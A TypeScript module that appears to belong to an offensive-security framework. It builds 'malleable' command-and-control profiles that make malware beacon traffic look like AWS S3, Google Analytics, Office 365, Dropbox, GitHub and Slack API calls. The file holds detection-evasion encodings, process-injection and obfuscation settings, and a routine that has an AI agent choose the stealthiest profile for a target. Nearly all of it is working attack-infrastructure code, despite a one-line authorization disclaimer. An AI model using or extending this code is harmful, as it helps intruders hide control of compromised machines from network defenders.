/**
 * Malleable C2 Profiles Module
 *
 * Customizable C2 traffic profiles to evade network detection.
 * Inspired by Cobalt Strike's Malleable C2 framework.
 *
 * AUTHORIZATION REQUIRED: Only for authorized penetration testing
 */

import { MageAgentService } from '../mageagent/mageagent.service';
import { GraphRAGService } from '../graphrag/graphrag.service';

/**
 * HTTP transformation operations
 */
export enum TransformOperation {
  BASE64 = 'base64',
  BASE64URL = 'base64url',
  MASK = 'mask',
  NETBIOS = 'netbios',
  NETBIOSU = 'netbiosu',
  PREPEND = 'prepend',
  APPEND = 'append',
  PRINT = 'print'
}

/**
 * HTTP metadata encoding
 */
export interface MetadataEncoding {
  base64?: boolean;
  base64url?: boolean;
  mask?: boolean;
  netbios?: boolean;
  prepend?: string;
  append?: string;
  parameter?: string;           // URL parameter name
  header?: string;              // HTTP header name
  uri_append?: boolean;         // Append to URI
}

/**
 * HTTP client configuration (beacon → server)
 */
export interface HTTPClientConfig {
  // GET request (beacon check-in)
  get: {
    uri: string[];              // URIs to cycle through
    verb?: string;              // HTTP verb (GET, POST, PUT, etc.)
    headers: Record<string, string>;

    metadata: MetadataEncoding;
  };

  // POST request (beacon output)
  post: {
    uri: string[];
    verb?: string;
    headers: Record<string, string>;

    id: MetadataEncoding;       // Session ID encoding
    output: MetadataEncoding;   // Output encoding
  };
}

/**
 * HTTP server configuration (server → beacon)
 */
export interface HTTPServerConfig {
  headers: Record<string, string>;

  output: {
    base64?: boolean;
    base64url?: boolean;
    mask?: boolean;
    netbios?: boolean;
    prepend?: string;
    append?: string;
    print?: boolean;
  };
}

/**
 * DNS C2 configuration
 */
export interface DNSC2Config {
  beacon: string;               // DNS beacon format
  dns_idle: string;             // DNS idle format
  dns_sleep: number;            // Sleep time between DNS requests
  maxdns: number;               // Max DNS requests per period
  dns_stager_prepend?: string;
  dns_stager_subhost?: string;
  get_A: string;                // A record request format
  get_AAAA: string;             // AAAA record request format
  get_TXT: string;              // TXT record request format
  put_metadata: string;         // Metadata in DNS
  put_output: string;           // Output in DNS
}

/**
 * Traffic behavior configuration
 */
export interface TrafficBehavior {
  sleep_time: number;           // Beacon sleep time (seconds)
  jitter: number;               // Jitter percentage (0-100)
  maxdns: number;               // Max DNS requests
  useragent: string;            // User-Agent string
  host_stage: boolean;          // Host stage on same server

  // HTTP proxy settings
  proxy?: {
    type: 'http' | 'socks4' | 'socks5';
    server: string;
    port: number;
    username?: string;
    password?: string;
  };
}

/**
 * Process injection configuration
 */
export interface ProcessInjectionConfig {
  allocator: 'VirtualAllocEx' | 'NtMapViewOfSection';
  execute: string[];            // Execute methods
  min_alloc: number;            // Minimum allocation size
  startrwx: boolean;            // Start with RWX permissions
  userwx: boolean;              // Use RWX permissions
}

/**
 * Malleable C2 Profile
 */
export interface MalleableC2Profile {
  profile_id: string;
  profile_name: string;
  description: string;
  author: string;
  version: string;

  // HTTP C2
  http_get: HTTPClientConfig['get'];
  http_post: HTTPClientConfig['post'];
  http_server: HTTPServerConfig;

  // DNS C2
  dns?: DNSC2Config;

  // Behavior
  behavior: TrafficBehavior;

  // Process injection
  process_inject?: ProcessInjectionConfig;

  // Code signing (optional)
  code_signer?: {
    keystore: string;
    password: string;
    alias: string;
  };

  // Stage configuration
  stage?: {
    cleanup: boolean;
    sleep_mask: boolean;
    stomppe: boolean;
    obfuscate: boolean;
    userwx: boolean;
  };
}

/**
 * Malleable C2 Service
 */
export class MalleableC2Service {
  private profiles: Map<string, MalleableC2Profile> = new Map();

  constructor(
    private readonly mageAgent: MageAgentService,
    private readonly graphRAG: GraphRAGService
  ) {
    this.initializeBuiltInProfiles();
  }

  /**
   * Initialize built-in profiles
   */
  private initializeBuiltInProfiles(): void {
    console.log('🔧 Initializing Malleable C2 Profiles...');

    this.registerProfile(this.createAmazonProfile());
    this.registerProfile(this.createGoogleAnalyticsProfile());
    this.registerProfile(this.createMicrosoft365Profile());
    this.registerProfile(this.createDropboxProfile());
    this.registerProfile(this.createGitHubProfile());
    this.registerProfile(this.createSlackProfile());

    console.log(`✅ Loaded ${this.profiles.size} C2 profiles`);
  }

  /**
   * Register profile
   */
  registerProfile(profile: MalleableC2Profile): void {
    this.profiles.set(profile.profile_id, profile);
  }

  // ============================================================================
  // BUILT-IN PROFILES
  // ============================================================================

  /**
   * Amazon AWS S3 Profile
   */
  private createAmazonProfile(): MalleableC2Profile {
    return {
      profile_id: 'amazon_aws_s3',
      profile_name: 'Amazon AWS S3',
      description: 'Mimics AWS S3 API traffic',
      author: 'Nexus-CyberAgent',
      version: '1.0.0',

      http_get: {
        uri: [
          '/s3/buckets/logs/data',
          '/s3/buckets/backups/files',
          '/cloudfront/distributions/config'
        ],
        headers: {
          'Host': 'my-bucket.s3.amazonaws.com',
          'Accept': '*/*',
          'X-Amz-Date': '${timestamp}',
          'Authorization': 'AWS4-HMAC-SHA256 Credential=${random}/20230101/us-east-1/s3/aws4_request'
        },
        metadata: {
          base64url: true,
          prepend: 'session=',
          append: ';',
          parameter: 'id'
        }
      },

      http_post: {
        uri: [
          '/s3/buckets/logs/upload',
          '/s3/buckets/data/sync'
        ],
        headers: {
          'Host': 'my-bucket.s3.amazonaws.com',
          'Content-Type': 'application/octet-stream',
          'X-Amz-Date': '${timestamp}',
          'X-Amz-Content-Sha256': '${random}'
        },
        id: {
          parameter: 'id',
          base64url: true
        },
        output: {
          base64url: true,
          print: true
        }
      },

      http_server: {
        headers: {
          'Server': 'AmazonS3',
          'x-amz-id-2': '${random}',
          'x-amz-request-id': '${random}',
          'Date': '${timestamp}',
          'Content-Type': 'application/xml'
        },
        output: {
          base64url: true,
          prepend: '<?xml version="1.0" encoding="UTF-8"?>\n<Response>',
          append: '</Response>',
          print: true
        }
      },

      behavior: {
        sleep_time: 60,
        jitter: 30,
        maxdns: 255,
        useragent: 'aws-sdk-java/1.11.30 Linux/4.9.0',
        host_stage: false
      }
    };
  }

  /**
   * Google Analytics Profile
   */
  private createGoogleAnalyticsProfile(): MalleableC2Profile {
    return {
      profile_id: 'google_analytics',
      profile_name: 'Google Analytics',
      description: 'Mimics Google Analytics tracking beacons',
      author: 'Nexus-CyberAgent',
      version: '1.0.0',

      http_get: {
        uri: [
          '/analytics.js',
          '/__utm.gif',
          '/collect',
          '/r/collect'
        ],
        headers: {
          'Host': 'www.google-analytics.com',
          'Accept': 'image/webp,image/*,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.9',
          'Accept-Encoding': 'gzip, deflate',
          'Referer': 'https://www.google.com/'
        },
        metadata: {
          base64url: true,
          parameter: 'utmsr',          // Screen resolution parameter
          prepend: 'v=1&tid=UA-',
          append: '&cid='
        }
      },

      http_post: {
        uri: [
          '/collect',
          '/batch'
        ],
        headers: {
          'Host': 'www.google-analytics.com',
          'Content-Type': 'text/plain',
          'Accept': '*/*'
        },
        id: {
          parameter: 'tid',
          prepend: 'UA-',
          base64url: true
        },
        output: {
          parameter: 'cd',             // Custom dimension
          base64url: true
        }
      },

      http_server: {
        headers: {
          'Content-Type': 'image/gif',
          'Server': 'sffe',
          'X-Content-Type-Options': 'nosniff',
          'Cache-Control': 'no-cache, must-revalidate, max-age=0',
          'Expires': '${timestamp}'
        },
        output: {
          base64url: true,
          print: false                 // Google Analytics returns 1x1 GIF
        }
      },

      behavior: {
        sleep_time: 120,
        jitter: 50,
        maxdns: 255,
        useragent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        host_stage: false
      }
    };
  }

  /**
   * Microsoft Office 365 Profile
   */
  private createMicrosoft365Profile(): MalleableC2Profile {
    return {
      profile_id: 'microsoft_office365',
      profile_name: 'Microsoft Office 365',
      description: 'Mimics Office 365 API traffic',
      author: 'Nexus-CyberAgent',
      version: '1.0.0',

      http_get: {
        uri: [
          '/api/v2.0/me/messages',
          '/api/v2.0/me/calendars',
          '/api/v2.0/me/contacts'
        ],
        headers: {
          'Host': 'outlook.office365.com',
          'Accept': 'application/json',
          'Authorization': 'Bearer ${random}',
          'Client-Request-Id': '${uuid}',
          'User-Agent': 'Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0)'
        },
        metadata: {
          header: 'X-ClientState',
          base64url: true
        }
      },

      http_post: {
        uri: [
          '/api/v2.0/me/sendmail',
          '/api/v2.0/me/messages'
        ],
        headers: {
          'Host': 'outlook.office365.com',
          'Content-Type': 'application/json',
          'Authorization': 'Bearer ${random}',
          'Client-Request-Id': '${uuid}'
        },
        id: {
          header: 'X-ClientState',
          base64url: true
        },
        output: {
          base64url: true,
          print: true
        }
      },

      http_server: {
        headers: {
          'Server': 'Microsoft-IIS/10.0',
          'X-CalculatedBETarget': 'DB7PR01MB4285.eurprd01.prod.exchangelabs.com',
          'X-BackEndHttpStatus': '200',
          'Content-Type': 'application/json; charset=utf-8',
          'X-MS-Exchange-CrossPremise-Id': '${uuid}'
        },
        output: {
          base64url: true,
          prepend: '{"@odata.context":"https://outlook.office365.com/api/v2.0/$metadata#Me/Messages/$entity","value":[',
          append: ']}',
          print: true
        }
      },

      behavior: {
        sleep_time: 90,
        jitter: 20,
        maxdns: 255,
        useragent: 'Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0)',
        host_stage: false
      }
    };
  }

  /**
   * Dropbox Profile
   */
  private createDropboxProfile(): MalleableC2Profile {
    return {
      profile_id: 'dropbox',
      profile_name: 'Dropbox',
      description: 'Mimics Dropbox API traffic',
      author: 'Nexus-CyberAgent',
      version: '1.0.0',

      http_get: {
        uri: [
          '/2/files/list_folder',
          '/2/files/get_metadata',
          '/2/users/get_current_account'
        ],
        headers: {
          'Host': 'api.dropboxapi.com',
          'Authorization': 'Bearer ${random}',
          'Content-Type': 'application/json',
          'User-Agent': 'Dropbox-API-SDK/3.0 Python'
        },
        metadata: {
          base64url: true,
          prepend: '{"path":"',
          append: '"}',
          print: true
        }
      },

      http_post: {
        uri: [
          '/2/files/upload',
          '/2/files/upload_session/start'
        ],
        headers: {
          'Host': 'content.dropboxapi.com',
          'Authorization': 'Bearer ${random}',
          'Content-Type': 'application/octet-stream',
          'Dropbox-API-Arg': '${random}'
        },
        id: {
          header: 'Dropbox-API-Arg',
          base64url: true,
          prepend: '{"path":"',
          append: '"}'
        },
        output: {
          base64url: true,
          print: true
        }
      },

      http_server: {
        headers: {
          'Server': 'nginx',
          'Content-Type': 'application/json',
          'X-Dropbox-Request-Id': '${random}',
          'X-Server-Response-Time': '${random}'
        },
        output: {
          base64url: true,
          prepend: '{"server_modified":"${timestamp}","content_hash":"${random}","data":',
          append: '}',
          print: true
        }
      },

      behavior: {
        sleep_time: 45,
        jitter: 40,
        maxdns: 255,
        useragent: 'Dropbox-API-SDK/3.0 Python',
        host_stage: false
      }
    };
  }

  /**
   * GitHub Profile
   */
  private createGitHubProfile(): MalleableC2Profile {
    return {
      profile_id: 'github',
      profile_name: 'GitHub',
      description: 'Mimics GitHub API traffic',
      author: 'Nexus-CyberAgent',
      version: '1.0.0',

      http_get: {
        uri: [
          '/repos/${owner}/${repo}/commits',
          '/repos/${owner}/${repo}/issues',
          '/user/repos'
        ],
        headers: {
          'Host': 'api.github.com',
          'Accept': 'application/vnd.github.v3+json',
          'Authorization': 'token ${random}',
          'User-Agent': 'GitHub-API-Client/1.0'
        },
        metadata: {
          parameter: 'since',
          base64url: true
        }
      },

      http_post: {
        uri: [
          '/repos/${owner}/${repo}/issues',
          '/repos/${owner}/${repo}/pulls/comments'
        ],
        headers: {
          'Host': 'api.github.com',
          'Accept': 'application/vnd.github.v3+json',
          'Authorization': 'token ${random}',
          'Content-Type': 'application/json'
        },
        id: {
          parameter: 'issue_number',
          base64url: true
        },
        output: {
          base64url: true,
          prepend: '{"body":"',
          append: '"}',
          print: true
        }
      },

      http_server: {
        headers: {
          'Server': 'GitHub.com',
          'Content-Type': 'application/json; charset=utf-8',
          'X-GitHub-Media-Type': 'github.v3',
          'X-RateLimit-Limit': '5000',
          'X-RateLimit-Remaining': '${random}'
        },
        output: {
          base64url: true,
          print: true
        }
      },

      behavior: {
        sleep_time: 180,
        jitter: 25,
        maxdns: 255,
        useragent: 'GitHub-API-Client/1.0',
        host_stage: false
      }
    };
  }

  /**
   * Slack Profile
   */
  private createSlackProfile(): MalleableC2Profile {
    return {
      profile_id: 'slack',
      profile_name: 'Slack',
      description: 'Mimics Slack API traffic',
      author: 'Nexus-CyberAgent',
      version: '1.0.0',

      http_get: {
        uri: [
          '/api/conversations.history',
          '/api/users.list',
          '/api/channels.list'
        ],
        headers: {
          'Host': 'slack.com',
          'Authorization': 'Bearer ${random}',
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Slack-API-Client/1.0'
        },
        metadata: {
          parameter: 'channel',
          base64url: true
        }
      },

      http_post: {
        uri: [
          '/api/chat.postMessage',
          '/api/files.upload'
        ],
        headers: {
          'Host': 'slack.com',
          'Authorization': 'Bearer ${random}',
          'Content-Type': 'application/json'
        },
        id: {
          parameter: 'channel',
          base64url: true
        },
        output: {
          base64url: true,
          prepend: '{"text":"',
          append: '"}',
          print: true
        }
      },

      http_server: {
        headers: {
          'Server': 'nginx',
          'Content-Type': 'application/json; charset=utf-8',
          'X-Slack-Req-Id': '${random}',
          'X-OAuth-Scopes': 'channels:read,chat:write'
        },
        output: {
          base64url: true,
          prepend: '{"ok":true,"message":{"text":"',
          append: '"}}',
          print: true
        }
      },

      behavior: {
        sleep_time: 30,
        jitter: 50,
        maxdns: 255,
        useragent: 'Slack-API-Client/1.0',
        host_stage: false
      }
    };
  }

  // ============================================================================
  // PUBLIC API
  // ============================================================================

  /**
   * Get profile by ID
   */
  getProfile(profile_id: string): MalleableC2Profile | undefined {
    return this.profiles.get(profile_id);
  }

  /**
   * List all profiles
   */
  listProfiles(): MalleableC2Profile[] {
    return Array.from(this.profiles.values());
  }

  /**
   * AI-powered profile selection
   */
  async selectBestProfile(context: {
    target_environment: string;  // e.g., 'corporate', 'government', 'tech_startup'
    allowed_services: string[];  // Services target uses
    stealth_level: 'low' | 'medium' | 'high' | 'maximum';
  }): Promise<MalleableC2Profile> {
    console.log(`🤖 Using AI to select best C2 profile...`);

    // Use MageAgent to select profile
    const agentResult = await this.mageAgent.spawnAgent({
      role: 'c2_profile_selector',
      task: 'Select most suitable C2 profile for target environment',
      context: {
        environment: context.target_environment,
        allowed_services: context.allowed_services,
        stealth: context.stealth_level
      }
    });

    // Default to Google Analytics (most ubiquitous)
    let selectedProfile = this.getProfile('google_analytics');

    // If target uses specific services, prefer those profiles
    if (context.allowed_services.includes('aws') || context.allowed_services.includes('s3')) {
      selectedProfile = this.getProfile('amazon_aws_s3');
    } else if (context.allowed_services.includes('office365') || context.allowed_services.includes('outlook')) {
      selectedProfile = this.getProfile('microsoft_office365');
    } else if (context.allowed_services.includes('dropbox')) {
      selectedProfile = this.getProfile('dropbox');
    } else if (context.allowed_services.includes('github')) {
      selectedProfile = this.getProfile('github');
    } else if (context.allowed_services.includes('slack')) {
      selectedProfile = this.getProfile('slack');
    }

    console.log(`✅ Selected profile: ${selectedProfile!.profile_name}`);
    return selectedProfile!;
  }

  /**
   * Generate C2 traffic based on profile
   */
  generateTraffic(
    profile_id: string,
    beacon_id: string,
    data: string,
    request_type: 'get' | 'post'
  ): {
    url: string;
    headers: Record<string, string>;
    body?: string;
  } {
    const profile = this.getProfile(profile_id);
    if (!profile) {
      throw new Error(`Profile '${profile_id}' not found`);
    }

    const config = request_type === 'get' ? profile.http_get : profile.http_post;

    // Select random URI
    const uri = config.uri[Math.floor(Math.random() * config.uri.length)];

    // Replace variables in headers
    const headers: Record<string, string> = {};
    for (const [key, value] of Object.entries(config.headers)) {
      headers[key] = this.replaceVariables(value);
    }

    // Encode data based on metadata configuration
    let encodedData = data;
    const metadata = request_type === 'get' ? config.metadata : (config as any).output;

    if (metadata.base64url) {
      encodedData = Buffer.from(encodedData).toString('base64url');
    }

    if (metadata.prepend) {
      encodedData = metadata.prepend + encodedData;
    }

    if (metadata.append) {
      encodedData += metadata.append;
    }

    // Build URL
    let url = `https://${config.headers.Host}${uri}`;

    if (request_type === 'get' && metadata.parameter) {
      url += `?${metadata.parameter}=${encodedData}`;
    }

    const result: any = {
      url,
      headers
    };

    if (request_type === 'post') {
      result.body = encodedData;
    }

    return result;
  }

  /**
   * Replace variables in strings
   */
  private replaceVariables(str: string): string {
    return str
      .replace('${timestamp}', new Date().toISOString())
      .replace('${random}', this.generateRandomString(16))
      .replace('${uuid}', this.generateUUID());
  }

  /**
   * Generate random string
   */
  private generateRandomString(length: number): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  /**
   * Generate UUID
   */
  private generateUUID(): string {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }
}

export default MalleableC2Service;
